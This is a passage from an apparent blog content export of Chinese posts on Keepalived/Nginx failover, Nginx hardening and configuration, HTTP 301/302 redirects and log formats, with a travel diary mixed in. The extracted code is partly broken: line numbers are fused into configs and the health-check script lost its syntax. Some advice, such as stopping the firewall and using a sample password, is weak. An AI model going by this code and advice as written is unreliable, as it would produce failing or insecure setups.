地址，eth1值的获取可以在机器上执行ifconfig命令得到mcast_src_ip 192.168.1.51## 本机 IP 地址priority 100 ## 节点优先级,值范围 0-254,MASTER 要比 BACKUP 高 nopreempt ## 优先级高的设置 nopreempt 解决异常恢复后再次抢占的问题 advert_int 1 ## 组播信息发送间隔,两个节点设置必须一样,默认 1s ## 设置验证信息,两个节点必须一致authentication &#123; auth_type PASSauth_pass 1111 ## 真实生产,按需求对应该过来 &#125;将 track_script 块加入 instance 配置块.track_script &#123;chk_nginx ## 执行 Nginx 监控的服务&#125;虚拟 IP 池, 两个节点设置必须一样virtual_ipaddress &#123;192.168.1.50 ## 虚拟 ip,可以定义多个&#125; &#125; Keepalived 配置文件编辑（第一、二台配置稍微不同，不同点具体看下面重点说明） 编辑：vim /usr/local/keepalived/etc/keepalived/keepalived.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556! Configuration File for keepalived # 全局配置 global_defs &#123; # 邮箱通知配置，keepalived 在发生切换时需要发送 email 到的对象，一行一个 notification_email &#123; #acassen@firewall.loc #failover@firewall.loc #sysadmin@firewall.loc &#125; # 指定发件人 #notification_email_from Alexandre.Cassen@firewall.loc # 指定smtp服务器地址 #smtp_server 192.168.200.1 # 指定smtp连接超时时间，单位秒 #smtp_connect_timeout 30 router_id LVS_DEVEL vrrp_skip_check_adv_addr vrrp_strict&#125; # （重点）脚本监控实现 vrrp_script check_nginx &#123; # 运行脚本 script \"/opt/bash/nginx_check.sh\" # 时间间隔，2秒 interval 2 # 权重 weight 2 &#125; vrrp_instance VI_1 &#123; # （重点）Backup 机子这里是设置为：BACKUP state MASTER interface eth0 virtual_router_id 51 # （重点）Backup 机子要小于当前 Master 设置的 100，建议设置为 99 priority 100 # Master 与 Backup 负载均衡器之间同步检查的时间间隔，单位是秒 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; # （重点）配置虚拟 IP 地址，如果有多个则一行一个 virtual_ipaddress &#123; 192.168.1.50 &#125; # （重点）脚本监控调用 track_script &#123; check_nginx &#125; &#125; 附录：192.168.31.146（MASTER节点）的keepalived.conf 12345678910111213141516171819202122232425262728! Configuration File for keepalivedglobal_defs &#123; router_id dreyer-zk-03&#125;vrrp_script chk_nginx &#123; script \"/etc/keepalived/nginx_check.sh\" interval 2 weight -20&#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 146 mcast_src_ip 192.168.1.120 priority 100 nopreempt advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_nginx &#125; virtual_ipaddress &#123; 192.168.31.111 &#125;&#125; 192.168.31.154（BACKUP节点）的keepalived.conf 123456789101112131415161718192021222324252627! Configuration File for keepalivedglobal_defs &#123; router_id dreyer-zk-01&#125;vrrp_script chk_nginx &#123; script \"/etc/keepalived/nginx_check.sh\" interval 2 weight -20&#125;vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 146 mcast_src_ip 192.168.1.121 priority 90 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; track_script &#123; chk_nginx &#125; virtual_ipaddress &#123; 192.168.31.111 &#125;&#125; nginx_check.sh（Nginx状态检测脚本）12345678#!/bin/bashA=ps -C nginx –no-header |wc -lif [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx sleep 2 if [ps -C nginx --no-header |wc -l-eq 0 ];then killall keepalived fifi 脚本大意为：检查是否有nginx进程，如果没有，那么就启动nginx，启动后睡眠2秒，再检查是否有nginx的进程，如果没有的话，那么就杀掉keepalived的全部进程（杀掉进程后keepalived才能进行重新选举） 启动各自服务1234567891011121314151617四台机子都停掉防火墙：service iptables stop先启动两台 Tomcat：sh /usr/program/tomcat8/bin/startup.sh tail -200f /usr/program/tomcat8/logs/catalina.out检查两台 Tomcat 是否可以单独访问，最好给首页加上不同标识，好方便等下确认是否有负载. http://192.168.1.122:8080 http://192.168.1.123:8080启动两台 Nginx 服务：/usr/local/nginx/sbin/nginx 启动两台 Keepalived 服务：service keepalived start查看 Master 和 Backup 两台主机的对应日志：tail -f /var/log/messages 高可用测试模拟 Keepalived 挂掉关闭Master主机的Keepalived，查看 Master 和 Backup两台主机的对应日志： 1tail -f /var/log/messages 关闭服务： 1service keepalived stop 如果第二台机接管了，则表示成功重新开启 Master 主机的 Keepalived，查看 Master 和 Backup 两台主机的对应日志： 1tail -f /var/log/messages 重启服务：service keepalived restart 如果第一台机重新接管了，则表示成功 模拟 Nginx 挂掉 关闭 Master 主机的 Nginx，查看 Master 和 Backup 两台主机的对应日志： 1tail -f /var/log/messages 关闭服务：/usr/local/nginx/sbin/nginx -s stop如果第二台机接管了，则表示成功重新开启 Master 主机的 Nginx，查看 Master 和 Backup 两台主机的对应日志： 1tail -f /var/log/messages 重启 Nginx 服务：/usr/local/nginx/sbin/nginx -s reload 重启 Keepalived 服务：service keepalived restart 如果第一台机重新接管了，则表示成功 可以优化的地方，改为双主热备，监控脚本上带有自启动相关细节，后续再进行。 日志中常用的几句话解释： 12345- `Entering to MASTER STATE`，变成 Master 状态 - `Netlink reflector reports IP 192.168.1.50 added`，一般变为 Master 状态，都要重新加入虚拟 IP，一般叫法叫做：虚拟 IP 重新漂移到 Master 机子上- `Entering BACKUP STATE`，变成 Backup 状态 - `Netlink reflector reports IP 192.168.1.50 removed`，一般变为 Backup 状态，都要移出虚拟 IP，一般叫法叫做：虚拟 IP 重新漂移到 Master 机子上- `VRRP_Script(check_nginx) succeeded`，监控脚本执行成功 资料 http://xutaibao.blog.51cto.com/7482722/1669123 https://m.oschina.net/blog/301710 http://blog.csdn.net/u010028869/article/details/50612571 http://blog.csdn.net/wanglei_storage/article/details/51175418","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"黄山之旅","slug":"个人生活记录/黄山之旅","date":"2016-05-04T16:27:43.000Z","updated":"2017-03-14T05:56:00.000Z","comments":true,"path":"2016/05/05/个人生活记录/黄山之旅/","link":"","permalink":"http://blog.yangcvo.me/2016/05/05/个人生活记录/黄山之旅/","excerpt":"","text":"俗话说：“五岳归来不看山,黄山归来不看岳.”黄山以奇松、怪石、云海、温泉、冬雪“五绝”闻名中外.2016年5月1号 我和女票一起去黄山看日出。 出发前来一张： 4月29号我匆匆忙忙的买好了前往黄山风景区的大巴汽车票，第一次去也不懂很多，前提安排都没做好准备就出发了因为当天看5月1号是天气预报说雷阵雨转中雨，就害怕看日出的泡汤。 4月30号我和女票一起坐长途大巴到黄山风景区差不多4个多小时，挺方便的，直达风景区脚下，到那边是中午4点多，那时候天气很好，根本感觉不到明天会有雷阵雨的袭击。 到那边先要做好几点： 定好住宿酒店：因为那边酒店是挺多的，如果赶上节日去的话，估计也没了，所以要去的话，提前一个周，价格便宜几百。如果是想看日出的最好早点定，因为山上的酒店，几乎稍微一般般都要1.5K以上带好雨具： 因为那边黄山常年梅雨天气比较多，因为我那边玩，没带雨具，很多推销的卖一次性的雨衣，就千万不要买。最好自己带着，我是因为定酒店，酒店有送雨具，还有黄山旅游讲解景点和一幅地图。 （那是不是想问我是什么酒店：黄山大红门酒店 地理位置：寨西兆成天地B4幢） 那边的旅游门票：到那边以后只有一个南门是旅游的登上入口，旅游节假日人特别多，就需要排队，售票处是5点半开门。 选择走路上山还是乘坐索道：如果当天上去当天下来，我还是建议早上云古寺乘坐索道上去，到索道那边需要统一坐大巴车上去，大巴车需要购买门票，每个人20元，因为私家车是不能上去的。为什么建议早上乘坐索道上去好，因为早上风景太阳刚刚出来，上面风景最好，主要一些景点都是在山顶上面。 下来可以步行慢慢从后山下来，可以看到迎客松和天都峰。如果走路上去走路下来，就往慈光阁上去，因为那边上山的话比较轻松。下山可以往云海大峡谷那边。 印象最深的是：从云古寺坐索道上去 走不远就可以看到一颗连理松身体分开的，很独特。 谈谈吃的： 到那边记得吃的当地的徽菜特产点臭鳜鱼，和毛豆腐特别不错。还有笋肉，都挺好吃的。 那边最多的就是梅干菜烧饼，是那边的特产。 赶上了看日出的那一瞬间： 非常愉快的一次登山旅程。","raw":null,"content":null,"categories":[{"name":"生活","slug":"生活","permalink":"http://blog.yangcvo.me/categories/生活/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"},{"name":"旅行日记","slug":"旅行日记","permalink":"http://blog.yangcvo.me/tags/旅行日记/"}]},{"title":"Nginx 安全&优化&日志输出规范详细配置","slug":"Web服务技术/Nginx/Nginx 安全&优化&日志输出规范详细配置","date":"2016-04-05T09:25:23.000Z","updated":"2017-03-31T10:44:47.000Z","comments":true,"path":"2016/04/05/Web服务技术/Nginx/Nginx 安全&优化&日志输出规范详细配置/","link":"","permalink":"http://blog.yangcvo.me/2016/04/05/Web服务技术/Nginx/Nginx 安全&优化&日志输出规范详细配置/","excerpt":"","text":"##1.Nginx日志审计 ① 参考配置操作(1)编辑 nginx.conf 配置文件 将 error_log 前的“#”去掉，记录错误日志将 access_log 前的“#”去掉，记录访问日志(2)设置 access_log，修改配置文件如下： 1234log_format formatname '$remote_addr - $remote_user [$time_local] '' \"$request\" $status $body_bytes_sent \"$http_referer\" '' \"$http_user_agent\" \"$http_x_forwarded_for\"'; access_loglogs/access.log formantname; #formatname 是设置配置文件格式的名称 ② 备注事项查看 nginx.conf 配置文件中，error_log、access_log 前的“#”是否去掉0x02 服务1 限制 IP 访问对网站或敏感目录的访问 IP 进行限制① 参考配置操作(1)修改配置文件 vi /usr/local/nginx/conf/nginx.conf 具体设置如下： 12345location / &#123;deny 192.168.1.1; #拒绝 IPallow 192.168.1.0/24; #允许 IPallow 10.1.1.0/16; #允许 IPdeny all; #拒绝其他所有 IP (2)重新启动 nginx 服务 ② 备注事项根据应用场景，设置合适的 IP 地址，检查配置文件 #more /usr/local/nginx/conf/nginx.conf中的 2.控制超时时间控制超时时间，提高服务器性能，降低客户端的等待时间 ① 建议配置(1)修改配置文件 vim /usr/local/nginx/conf/nginx.conf 具体设置如下： 1234567891011121314151617181920212223242526272829303132client_body_timeout 10; #设置客户端请求主体读取超时时间client_header_timeout 10; #设置客户端请求头读取超时时间keepalive_timeout 5 5; #第一个参数指定客户端连接保持活动的超时时间，第二个参数是可选的，它指定了消息头保持活动的有效时间send_timeout 10; #指定响应客户端的超时时间(2)重新启动 nginx 服务② 备注事项需要根据应用场景的需要选择合适的参数值。1 、符合性判定依据超时后，服务器返回相应的消息。2 、参考检测方法检查配置文件 #more /usr/local/nginx/conf/nginx.conf3 下载限制并发和速度限制客户端下载速度，保证服务器负载正常① 建议配置例如网站存放路径为/usr/local/nsfocus/ ，服务器名称为：down.nsfocus.com(1)修改配置文件#vi /usr/local/nginx/conf/nginx.conf具体设置如下：limit_zone one $binary_remote_addr 10m;server&#123;listen 80;server_name down.nsfocus.com;index index.html index.htm index.PHP;oot /usr/local/nsfocus;#Zone limit;location / &#123;limit_conn one 1;limit_rate 20k;&#125;.....&#125; (2)重新启动 nginx 服务 下载时，不会超过设计的并发连接数和速度限制，同时检查 nginx.conf 文件中的配置 其他事项 3.卸载不需要的模块卸载不需要的 nginx 模块, 最大限度地将 nginx 加载的模块最小化 ① 建议配置(1)检查需要禁用的模块 在编译 nginx 服务器时，使用下面的命令查看哪些模块应该启用，哪些模应该禁用： # ./configure --help | less 一旦处选了要禁用的模块，需要与相关人员沟通确认，并经过测试不影响业务运行。 (2)例如，要禁用 autoindex 和 SSI 模块，命令如下： 123# ./configure --without-http_autoindex_module --without-http_ssi_module# make# make install ② 备注事项Nginx 不包含不必要的模块或者输入 ./configure –help | less 进行检查 ##4.防盗链设置防止其他网站盗链本网站资源 ① 建议配置(1)修改配置文件 #vi /usr/local/nginx/conf/nginx.conf 具体设置如下： 12345678location ~* ^.+\\.(gif|jpg|png|swf|flv|rar|zip)$ &#123;valid_referers none blocked server_names *.nsfocus.comhttp://localhost baidu.com;if ($invalid_referer) &#123;rewrite ^/ [img]http://www.ihaozhuo.com/images/default/logo.gif[/img];# return 403;&#125;&#125; 根据应用场景，设置合适的域名(2)Nginx -t 检查配置是否有没有问题。 重新启动 nginx 服务 ② 备注事项从非法网站访问所保护的资源，出现设置的页面。同时检查配置文件 #more /usr/local/nginx/conf/nginx.conf ##5.自定义错误信息1)修改 src/http/ngx_http_special_response.c，自己定制错误信息 123456789101112## messages with just a carriage return.static char ngx_http_error_400_page[] = CRLF;static char ngx_http_error_404_page[] = CRLF;static char ngx_http_error_413_page[] = CRLF;static char ngx_http_error_502_page[] = CRLF;static char ngx_http_error_504_page[] = CRLF;常见错误：400 bad request404 NOT FOUND413 Request Entity Too Large502 Bad Gateway504 Gateway Time-out (2)重新启动 nginx 服务 ② 备注事项URL 地址栏中输入 http://ip:8800/manager12345，访问出错时，返回自定义的错误页面 6.隐藏 nginx 服务信息头① 建议配置修改 nginx解压路径/src/http/ngx_http_header_filter_module.c文件的第48和 49 行内容，自定义头信息： 12static char ngx_http_server_string[] = “Server:XXXXX.com” CRLF;static char ngx_http_server_full_string[] = “Server:XXXXX.com” CRLF; 添加如下代码到 nginx.conf配置文件，禁止错误页面中显示 nginx 版本号： 1server_tokens off ② 备注事项服务信息头显示设置的内容，检查 http 服务信息头内容 6.补丁更新安装系统补丁，修补漏洞 1.参考配置操作手动安装补丁或安装最新版本软件，所安装的补丁，应首先在经过测试验证；安装前，要做好数据备份。2.查看版本和编译器信息","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Http response code 301 和 302分析总结","slug":"Web服务技术/Nginx/http response code 301 和 302分析总结","date":"2016-04-02T09:25:23.000Z","updated":"2017-04-12T13:36:22.000Z","comments":true,"path":"2016/04/02/Web服务技术/Nginx/http response code 301 和 302分析总结/","link":"","permalink":"http://blog.yangcvo.me/2016/04/02/Web服务技术/Nginx/http response code 301 和 302分析总结/","excerpt":"","text":"http response code 301 和 302 了解多少呢。一．官方说法最近Nginx访问出现301和302这里就对301 302认真做了一次总结。 123301，302 都是HTTP状态的编码，都代表着某个URL发生了转移，不同之处在于： 301 redirect: 301 代表永久性转移(Permanently Moved)。302 redirect: 302 代表暂时性转移(Temporarily Moved )。 这是很官方的说法，那么它们的区别到底是什么呢？ 二．现实中的差异 对于用户301，302对用户来说没有区别，他们看到效果只是一个跳转，浏览器中旧的URL变成了新的URL。页面跳到了这个新的url指向的地方。 对于引擎及站长 302 302转向可能会有URL规范化及网址劫持的问题。可能被搜索引擎判为可疑转向，甚至认为是作弊。网址规范化 请参见：网址劫持 302重定向和网址劫持（URL hijacking）有什么关系呢？这要从搜索引擎如何处理302转向说起。 从定义来说，从网址A做一个302重定向到网址B时，主机服务器的隐含意思是网址A随时有可能改主意，重新显示本身的内容或转向其他的地方。大部分的搜索引擎在大部分情况下，当收到302重定向时，一般只要去抓取目标网址就可以了，也就是说网址B。实际上如果搜索引擎在遇到302转向时，百分之百的都抓取目标网址B的话，就不用担心网址URL劫持了。问题就在于，有的时候搜索引擎，尤其是Google，并不能总是抓取目标网址。为什么呢？比如说，有的时候A网址很短，但是它做了一个302重定向到B网址，而B网址是一个很长的乱七八糟的URL网址，甚至还有可能包含一些问号之类的参数。很自然的，A网址更加用户友好，而B网址既难看，又不用户友好。这时Google很有可能会仍然显示网址A。由于搜索引擎排名算法只是程序而不是人，在遇到302重定向的时候，并不能像人一样的去准确判定哪一个网址更适当，这就造成了网址URL劫持的可能性。也就是说，一个不道德的人在他自己的网址A做一个302重定向到你的网址B，出于某种原因， Google搜索结果所显示的仍然是网址A，但是所用的网页内容却是你的网址B上的内容，这种情况就叫做网址URL劫持。你辛辛苦苦所写的内容就这样被别人偷走了。 301 当网页A用301重定向转到网页B时，搜索引擎可以肯定网页A永久的改变位置，或者说实际上不存在了，搜索引擎就会把网页B当作唯一有效目标。301的好处是: 12第一， 没有网址规范化问题。第二， 也很重要的，网页A的PR网页级别会传到网页B。 三．Apache中实现301、302 方法一，url rewrite，mod_rewrite [plain] 12345view plain copyRewriteengine on RewriteCond %&#123;HTTP_HOST&#125; ^cmp.soso.com [NC] RewriteRule ^/js/(.*) http://www.soso.com/js/$1 [R=301] ServerName cmp.soso.com 将cmp.soso.com中js目录的下所有访问重定向到http://www.soso.com/js/，指定跳转返回码为301。对于[R=301]的详解：‘redirect|R [=code]’ (强制重定向 redirect)以http://thishost[:thisport]/(使新的URL成为一个URI) 为前缀的Substitution可以强制性执行一个外部重定向。 如果code没有指定，则产生一个HTTP响应代码302(临时性移动)。 如果需要使用在300-400范围内的其他响应代码，只需在此指定这个数值即可， 另外，还可以使用下列符号名称之一: temp (默认的), permanent, seeother. 用它可以把规范化的URL反馈给客户端，如,重写``/~&#39;&#39;为 ``/u/&#39;&#39;，或对/u/user加上斜杠，等等。 注意: 在使用这个标记时，必须确保该替换字段是一个有效的URL! 否则，它会指向一个无效的位置! 并且要记住，此标记本身只是对URL加上 http://thishost[:thisport]/的前缀，`重写操作仍然会继续`。 通常，你会希望停止重写操作而立即重定向，则还需要使用’L’标记. 方法二 Redirect ，涉及模块：mod_alias 例： 123456[plain] view plain copy&lt;VirtualHost 10.1.146.163:80&gt; DocumentRoot /home/qmhball/web/mybranches/stat_3276/oa/ ServerName oalogin.com Redirect 301 /login.php http://www.soso.com &lt;/VirtualHost&gt; 将oalogin.com下对login.php的访问重定向到http://www.soso.com，返回码301。如果没有指定redirect的返回参数（例中的301），则默认重定向是”临时性的”(HTTP status 302)。","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nginx基础篇-Nginx.conf配置文件详解","slug":"Web服务技术/Nginx/Nginx基础篇-Nginx.conf配置文件详解","date":"2016-03-29T09:25:23.000Z","updated":"2017-04-17T11:20:10.000Z","comments":true,"path":"2016/03/29/Web服务技术/Nginx/Nginx基础篇-Nginx.conf配置文件详解/","link":"","permalink":"http://blog.yangcvo.me/2016/03/29/Web服务技术/Nginx/Nginx基础篇-Nginx.conf配置文件详解/","excerpt":"","text":"Nginx.conf配置文件详解Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。main部分设置的指令将影响其它所有部分的设置；server部分的指令主要用于指定虚拟主机域名、IP和端口；upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。 当前nginx支持的几个指令上下文： 2.1 通用下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#定义Nginx运行的用户和用户user www www;#nginx进程数，建议设置为等于CPU总核心数。这里我服务器4核worker_processes 4;#一个1核CPU对应一个进程数管理。这样能很好分配资源。worker_cpu_affinity 00000001 00000010 00000100 00001000; #全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#进程文件pid /var/run/nginx.pid;#一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除，但是nginx分配请求并不均匀，所以建议与ulimit -n的值保持一致。worker_rlimit_nofile 65535;#工作模式与连接数上限events&#123;#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型，如果跑在FreeBSD上面，就用kqueue模型。use epoll;#单个进程最大连接数（最大连接数=连接数*进程数）worker_connections 65535;&#125;#设定http服务器http&#123;include mime.types; #文件扩展名与文件类型映射表default_type application/octet-stream; #默认文件类型include /usr/local/nginx/conf/proxy.conf; #charset utf-8; #默认编码# log_format main '$remote_addr - $remote_user [$time_local] \"$request\" '# '$status $body_bytes_sent \"$http_referer\" '# '\"$http_user_agent\" \"$http_x_forwarded_for\"';# 默认的nginx日志格式 server_names_hash_bucket_size 128; #服务器名字的hash表大小client_header_buffer_size 32k; #上传文件大小限制large_client_header_buffers 4 64k; #设定请求缓client_max_body_size 8m; #设定请求缓sendfile on; #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。autoindex on; #开启目录列表访问，合适下载服务器，默认关闭。tcp_nopush on; #防止网络阻塞tcp_nodelay on; #防止网络阻塞keepalive_timeout 120; #长连接超时时间，单位是秒#keepalive 超时时间，客户端到服务端的连接持续有效时间当出现对服务器后，继续请求时keepalive_timeout功能可避免建立或者重新。#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzip模块设置gzip on; #开启gzip压缩输出gzip_min_length 1k; #最小压缩文件大小gzip_buffers 4 16k; #压缩缓冲区gzip_http_version 1.0; #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）gzip_comp_level 2; #压缩等级gzip_types text/plain application/x-javascript text/css application/xml;#压缩类型，默认就已经包含text/html，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #开启限制IP连接数的时候需要使用upstream blog.yangcvo.com &#123;#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。server 192.168.80.121:80 weight=3 max_fails=2 fail_timeout=30s;server 192.168.80.122:80 weight=2 max_fails=2 fail_timeout=30s;server 192.168.80.123:80 weight=3 max_fails=2 fail_timeout=30s;&#125;#虚拟主机的配置server&#123;#监听端口listen 80;#域名可以有多个，用空格隔开server_name www.yangcvo.com ; ##(服务器名)index index.html index.htm index.php;root /data/www/ha97; location ~ .*\\.(php|php5)?$&#123;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;include fastcgi.conf;&#125;#图片缓存时间设置location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JS和CSS缓存时间设置location ~ .*\\.(js|css)?$&#123;expires 1h;&#125;#日志格式设定log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ''$status $body_bytes_sent \"$http_referer\" ''\"$http_user_agent\" $http_x_forwarded_for';#定义本虚拟主机的访问日志access_log /var/log/nginx/access.log access;#对 \"/\" 启用反向代理location / &#123;proxy_pass http://127.0.0.1:88;proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#后端的Web服务器可以通过X-Forwarded-For获取用户真实IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#以下是一些反向代理的配置，可选。proxy_set_header Host $host;client_max_body_size 10m; #允许客户端请求的最大单文件字节数client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数，proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时)proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的设置proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）proxy_temp_file_write_size 64k;#设定缓存文件夹大小，大于这个值，将从upstream服务器传&#125;#设定查看Nginx状态的地址location /NginxStatus &#123;stub_status on;access_log on;auth_basic \"NginxStatus\";auth_basic_user_file conf/htpasswd;#htpasswd文件的内容可以用apache提供的htpasswd工具来产生。&#125;#本地动静分离反向代理配置#所有jsp的页面均交由tomcat或resin处理location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#所有静态文件由nginx直接读取不经过tomcat或resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112user www www;worker_processes 2;error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid logs/nginx.pid;events &#123; use epoll; worker_connections 65535;&#125;http &#123; include mime.types; default_type application/octet-stream; include /usr/local/nginx/conf/proxy.conf; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; # tcp_nopush on; keepalive_timeout 65; # gzip压缩功能设置 gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml; gzip_vary on; # http_proxy 设置 client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 75; proxy_send_timeout 75; proxy_read_timeout 75; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # 设定负载均衡后台服务器列表 upstream backend &#123; #ip_hash; server 192.168.10.100:8080 max_fails=2 fail_timeout=30s ; server 192.168.10.101:8080 max_fails=2 fail_timeout=30s ; &#125; # 很重要的虚拟主机配置 server &#123; listen 80; server_name itoatest.example.com; root /apps/oaapp; charset utf-8; access_log logs/host.access.log main; #对 / 所有做负载均衡+反向代理 location / &#123; root /apps/oaapp; index index.jsp index.html index.htm; proxy_pass http://backend; proxy_redirect off; # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; &#125; #静态文件，nginx自己处理，不去backend请求tomcat location ~* /download/ &#123; root /apps/oa/fs; &#125; location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ &#123; root /apps/oaapp; expires 7d; &#125; location /nginx_status &#123; stub_status on; access_log off; allow 192.168.10.0/24; deny all; &#125; location ~ ^/(WEB-INF)/ &#123; deny all; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;","raw":null,"content":null,"categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/categories/Nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"Nginx基础篇-日志管理和切割","slug":"Web服务技术/Nginx/nginx基础篇-日志管理和切割","date":"2016-03-29T09:25:23.000Z","updated":"2017-03-31T10:29:53.000Z","comments":true,"path":"2016/03/29/Web服务技术/Nginx/nginx基础篇-日志管理和切割/","link":"","permalink":"http://blog.yangcvo.me/2016/03/29/Web服务技术/Nginx/nginx基础篇-日志管理和切割/","excerpt":"","text":"前言：公司日志查看有时候不太规范，官网web服务日志这边整理了下Nginx日志输出优化。 一、日志分类Nginx日志主要分为两种，访问日志和错误日志。两种日志可以在http和server模块中配置，nginx有一个非常灵活的日志记录模式。每个级别的配置可以有各自独立的访问日志。日志格式通过log_format命令来定义 1、访问日志访问日志主要记录客户端访问Nginx的每一个请求log_format用来设置日志格式，只能在http模块下设置 log_format name name(格式名称) type(格式样式) 下面是默认的nginx日志格式： 123log_format main '$remote_addr - $remote_user [$time_local]\"$request\" ' '$status $body_bytes_sent\"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; 字段含义： $remote_addr远程客户端的IP地址。 $remote_user远程客户端用户名称，如果网站设置了用户验证的话就会有，否则空白 [$time_local]访问的时间与时区比如18/Jul/2012:17:00:01+0800时间信息最后的&quot;+0800&quot;表示服务器所处时区位于UTC之后的8小时。 $request记录请求的url和http协议 $status记录请求返回的http状态码. $body_bytes_sent记录发送给客户端的文件主体内容的大小 $http_referer记录 记录从哪个页面链接访问过来的。 $http_user_agent记录客户端浏览器信息 